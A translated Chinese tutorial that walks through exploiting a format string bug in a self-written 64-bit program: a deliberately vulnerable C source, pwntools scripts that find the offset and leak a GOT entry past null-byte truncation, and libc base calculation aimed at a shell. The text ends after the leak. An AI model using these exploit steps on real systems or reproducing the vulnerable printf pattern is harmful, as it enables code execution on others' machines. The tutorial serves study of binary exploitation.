# 64位格式化字符串漏洞修改got表利用详解
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 前言
格式化字符串漏洞是最基础也是很老的一个漏洞了，网上一搜索就会有一堆的解释、原理、以及利用，但全都是对32位的格式化漏洞的解析，64位的几乎没有，就算有也被一笔带过。
但是当你利用格式化漏洞来修改64位elf的got表时，你会发现并没有详细的那么简单，虽然和32位的原理一样，但payload的构建方法却有所差别。甚至难度也大大增加
故此有了此处尝试以及尝试后的一些总结
## 漏洞分析
程序源码：
    #include
    void huan(){
        setvbuf(stdin, 0LL, 2, 0LL);
        setvbuf(stdout, 0LL, 2, 0LL);
        setvbuf(stderr, 0LL, 2, 0LL);
        return;
    }
    int main(){
        char s[60];
        huan(); //该函数用来设置缓冲区
        while(1){
            puts("plese input:");
            read(0,s,0x60);
            printf(s);
            printf("n");
        }
        return 0;
    }
## 漏洞成因
pritnf作为c语言中的输出函数，其使用方式是填充两个参数，分别是格式化字符和变量即：printf(“格式化字符”,变量（指针、整形等变量）);
但有的人为了省事也会写成 printf(变量); 虽然都可以正常输出，但那是在正常情况下。而在不正常的情况下比如被利用时，printf(变量);
这样的写法就变得很危险了
其中格式化字符有：
%c：输出字符，配上%n可用于向指定地址写数据。
%d：输出十进制整数，配上%n可用于向指定地址写数据。
%x：输出16进制数据，如%i$x表示要泄漏偏移i处4字节长的16进制数据，%i$lx表示要泄漏偏移i处8字节长的16进制数据，32bit和64bit环境下一样。
%p：输出16进制数据，与%x基本一样，只是附加了前缀0x，在32bit下输出4字节，在64bit下输出8字节，可通过输出字节的长度来判断目标环境是32bit还是64bit。
%s：输出的内容是字符串，即将偏移处指针指向的字符串输出，如%i$s表示输出偏移i处地址所指向的字符串，在32bit和64bit环境下一样，可用于读取GOT表等信息。
%n：将%n之前printf已经打印的字符个数赋值给偏移处指针所指向的地址位置，如%100x%10$n表示将0x64写入偏移10处保存的指针所指向的地址（4字节），而%$hn表示写入的地址空间为2字节，%$hhn表示写入的地址空间为1字节，%$lln表示写入的地址空间为8字节，在32bit和64bit环境下一样。有时，直接写4字节会导致程序崩溃或等候时间过长，可以通过%$hn或%$hhn来适时调整。
%n是通过格式化字符串漏洞改变程序流程的关键方式，而其他格式化字符串参数可用于读取信息或配合%n写数据。
具体如下：
正常输入时可以正常输出：
但是当输入的时格式化字符时：
对比可以发现，正常输入确实可以正常输出，但恶意的输入格式化字符时，那就不行了，危险了，而且是大大的危险了
因为格式化字符，有的可以用来读取，有的可以用来修改，而结合起来就是可读写，相当于当黑客能够掌握这个漏洞时，就拥有了你的计算机的权限，你的计算机也将不再是你的计算机
具体利用请往下看（太过详细的本文不再解释，度娘有一大堆，但偏偏没有64位的，当然可能是本人太菜没找到，欢迎大佬指教、推荐）
此处就接用自己写的程序来讲解64位格式化字符串漏洞的利用
## 程序分析
该程序是由c语言写的，并没有其他的太多套路，仅作为个人研究格式化字符串漏洞所用，故直接按起手式进行：
接着ida查看伪码：
（本次为了方便，在源码中直接加入了死循环方便格式化字符串漏洞的利用，如果没有循环的话，则可以修改
的值为入口函数的地址，详细的可以参考[https://blog.csdn.net/qq_39268483/article/details/92399248，也可自行百度，度娘还是有一堆）](https://blog.csdn.net/qq_39268483/article/details/92399248%EF%BC%8C%E4%B9%9F%E5%8F%AF%E8%87%AA%E8%A1%8C%E7%99%BE%E5%BA%A6%EF%BC%8C%E5%BA%A6%E5%A8%98%E8%BF%98%E6%98%AF%E6%9C%89%E4%B8%80%E5%A0%86%EF%BC%89)
## 开始利用
思路：
漏洞很明显，就是格式化字符串漏洞，但是审查函数，发现，该程序中并没有system等可以getshell的函数，所以第一步必须先泄露got表中的真实地址，进而获取libc的版本，然后通过libc的版本以及got表中的函数的实际地址，来求出程序运行时的基地址，有了基地址，就可以联合libc中的偏移，来计算出各个动态链接库中的函数的地址，进而getshell了
libc的获取，已经在前面泄露了got中的实际地址，则可以根据泄露出来的实际地址来查询libc
的版本，原理是，在程序运行时的地址虽然会变化，但其实际地址的后三位却不会改变（libc版本的查询及下载网址：[https://libc.blukat.me/）](https://libc.blukat.me/%EF%BC%89)
由于网上大部分都是直接给出计算过程而没有给出计算原理，所以本处给出基地址及目的函数的实际地址的计算原理：
第一步：基地址 = 实际地址（泄露的got地址） – libc中对应函数的偏移
第二部：目的函数地址 = 基地址 + libc中对应函数的偏移
获取了目的函数的实际地址，接下来就是利用格式化字符串漏洞来修改got表了
利用过程：
按思路一步一步来，先计算格式化字符串漏洞的偏移：
计算偏移前面输入用来观察的字符，后面输入n多个%x，然后根据泄露出来的十六进制，自己一个一个数偏移时多少，该处计算出偏移为6（或许有的师傅该说，这种简单的数偏移大家都会，我肯定是在浪费大家时间水文，其实不然，或许一个一个数大家都会，但操作起来却又相当麻烦，本处之所以提起偏移的计算，是想向个位师傅分享一个我自己的计算偏移的方法，如果师傅们有其他的好方法希望大家也可以向我分享下，在此拜谢）
    def pianyi(pwn_name,x = 'x'):
        print('pwn_name=' + pwn_name + ',x=' + x)
        i = 0
        while True :
            r = process(pwn_name) //用来打开程序运行测试偏移
            i += 1
                  /*这里我直接发送了payload，因为不同的程序，前面可能需要接收不同的数据，
                  所以师傅们用的时候，需要在此处加上recv进行接收数据*/
            payload = 'a'*4 + '.' + '%' + str(i) + '$' + '8x'
            r.sendline(payload)
            r.recvuntil("aaaa.")
            r_recv = r.recv(8)
            print('*'*10 + r_recv + '*'*10)
            if r_recv == '61616161':
                print(payload)
                if x == 'x':
                    s = '%' + str(i) + '$8x'
                else :
                    s = '%' + str(i) + '$8' + str(x)
                return s
                break
一个我自己定义的小函数，该函数调用时要在 process前面调用，不然在返回偏移后程序也就终止了，因为我在函数中用了process
name参数是要进行查格式化字符串偏移的pwn_name，
x是该函数的返回值（一个字符串）选择返回在改偏移下不同的格式化字符，
该函数前面如果需要recv的话，需要自行添加
效果：
循环process目标程序，知道找到偏移，则返回偏移并退出
函数调用exp：
    #-*-coding:utf-8 -*-    from pwn import *
    #context.log_level = 'debug'
    pwn_name = "./pwn33"
    #******************格式化字符串偏移****************
    def pianyi(pwn_name,x = 'x'):
        print('pwn_name=' + pwn_name + ',x=' + x)
        i = 0
        while True :
            r = process(pwn_name)
            i += 1
            payload = 'a'*4 + '.' + '%' + str(i) + '$' + '8x'
            r.sendline(payload)
            r.recvuntil("aaaa.")
            r_recv = r.recv(8)
            print('*'*10 + r_recv + '*'*10)
            if r_recv == '61616161':
                print(payload)
                if x == 'x':
                    s = '%' + str(i) + '$8x'
                else :
                    s = '%' + str(i) + '$8' + str(x)
                return s
                break
    #******************格式化字符串偏移****************
    pianyi(pwn_name)
    r = process(pwn_name)
    file = ELF(pwn_name)
第二步：
有了偏移就可以泄露got表（其中要知道，由于延迟绑定技术，只有在程序中执行过的函数，got中才会绑定其真实地址，所以要泄露的时漏洞之前已经执行过的函数）
首先我们先按照32位的payload ：payload = p32(泄露地址) + %偏移$x 来构建
exp：
    #-*-coding:utf-8 -*-    from pwn import *
    context.log_level = 'debug'
    pwn_name = "./pwn33"
    #******************格式化字符串偏移****************
    def pianyi(pwn_name,x = 'x'):
        print('pwn_name=' + pwn_name + ',x=' + x)
        i = 0
        while True :
            r = process(pwn_name)
            i += 1
            payload = 'a'*4 + '.' + '%' + str(i) + '$' + '8x'
            r.sendline(payload)
            r.recvuntil("aaaa.")
            r_recv = r.recv(8)
            print('*'*10 + r_recv + '*'*10)
            if r_recv == '61616161':
                print(payload)
                if x == 'x':
                    s = '%' + str(i) + '$8x'
                else :
                    s = '%' + str(i) + '$8' + str(x)
                return s
                break
    #******************格式化字符串偏移****************
    #pianyi(pwn_name)//只用泄露出偏移后就没多大用了，对于64位来说，还需改进，故注释
    r = process(pwn_name)
    file = ELF(pwn_name)
    #*****************泄露got表*************************
    r.recvuntil("plese input:")
    puts_got = file.got['puts']
    payload =p64(puts_got) + '%6$s'//如果和32位payload构建顺序一样地址在前，格式化字符在后，则。。。。。（看下面的效果图）
    r.sendline(payload)
    r.recvuntil('aaaa')
    puts_addr = u64(r.recv(6) + '00')
    #*****************泄露got表*************************
    r.interactive()
效果图：
看效果图，可以发现，在send发送数据时，确实按预期发送了，但是在经过printf输出时，recv接收到的数据，却出现了问题，仅printf到了发送的地址，却没有printf到格式化字符，而格式化字符都没有printf到，那还算是什么格式化字符串漏洞呢。那么原因在哪呢？明明这样来32位的就可以呀，嘿嘿，想继续往下看：
仔细看我们send发送的数据，前面的地址数据经p64()打包后占的是8个字节，就是蓝色方框前的那一串，而蓝色方框中的就是我们的格式化字符串，细心的人就已经发现了，我们send
的地址和我们构造的格式化字符串中间还有好多个 ‘00’ ，而在字符串中 ‘00’
就代表了结束，所以在printf到‘00’时，就被认为字符串已经结束了，自然不会继续往后面printf了，也即是说我们的字符串都被’00’给截断了。没办法，为了字符串不被截断，我们只能将地址给放在字符串的后面了  
exp：
    #-*-coding:utf-8 -*-    from pwn import *
    context.log_level = 'debug'
    pwn_name = "./pwn33"
    /*由于求偏移的函数在后面已经没多大用了，为了简洁后面都给去除了*/
    r = process(pwn_name)
    file = ELF(pwn_name)
    #*****************泄露got表*************************
    r.recvuntil("plese input:")
    puts_got = file.got['puts']  //获取got表的地址
    payload = 'a'*4 + '%7$s' + p64(puts_got)  //将地址放后面构建payload
    r.sendline(payload)
    r.recvuntil('aaaa')
    puts_addr = u64(r.recv(6) + '00')  //接收自got表中泄露出的真实地址
    #*****************泄露got表*************************
    r.interactive()
效果：
看浅蓝色方框，哪些 ‘00’
已经被放在了字符串的最后面，这样也就不会将格式化字符给截断而无法被printf了，而下面recv到的深蓝色方框中原本应该时我们构建的格式化字符的地方已经被解析为got中的实际地址了
有了got中的实际地址，那么就可以获取libc了，通过实际地址的后三位，上图中为：9c0
有了libc接下来计算 基地址 和 system的地址：
exp：
    #-*-coding:utf-8 -*-    from pwn import *
    context.log_level = 'debug'
    pwn_name = "./pwn33"
    r = process(pwn_name)
    file = ELF(pwn_name)
    #*****************泄露got表*************************
    r.recvuntil("plese input:")
    puts_got = file.got['puts']
    payload = 'a'*4 + '%7$s' + p64(puts_got)
    r.sendline(payload)
    r.recvuntil('aaaa')
    puts_addr = u64(r.recv(6) + '00')